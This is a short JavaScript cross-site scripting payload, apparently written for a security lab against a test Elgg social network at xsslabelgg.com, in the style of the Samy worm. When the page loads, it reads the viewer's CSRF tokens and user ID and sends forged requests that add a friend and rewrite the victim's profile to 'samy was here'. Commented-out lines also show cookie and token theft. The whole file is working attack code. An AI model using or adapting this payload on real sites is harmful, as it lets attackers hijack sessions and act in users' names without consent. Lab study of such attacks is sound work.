//alert(document.cookie)
window.onload=function(){
	//alert("Session Token:\t" + document.cookie + "\nts:\t" + elgg.security.token.__elgg_ts + "\ntoken:\t" + elgg.security.token.__elgg_token + "\nuser:\t" + elgg.page_owner.name + "\nuser ID:\t" + elgg.page_owner.guid);
	var friend = "friend="+elgg.page_owner.guid;
	var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token = "&__elgg_token="+elgg.security.token.__elgg_token;
	var variables = friend+ts+token;
	url="http://www.xsslabelgg.com/action/friends/add?"+variables;
	//alert(url);
	var Ajax1=null;
	Ajax1=new XMLHttpRequest();
	Ajax1.open("POST",url,true);
	Ajax1.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
	Ajax1.setRequestHeader("Accept","application/json,text/javascript, */*, q=0.01");
	Ajax1.setRequestHeader("X-Requested-With","XMLHttpRequest");
	Ajax1.send(variables);

	var id = "&guid="+elgg.page_owner.guid;
	var name = "&name="+elgg.page_owner;
	var edit = token+ts+name+"&description=&accesslevel[description]=2&briefdescription=escape(samy was here)&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2"+id; 

	var Ajax2 = null;
	Ajax2=new XMLHttpRequest();
	Ajax2.open("POST","http://xsslabelgg.com/action/profile/edit",true);
	Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax2.send(edit);
}
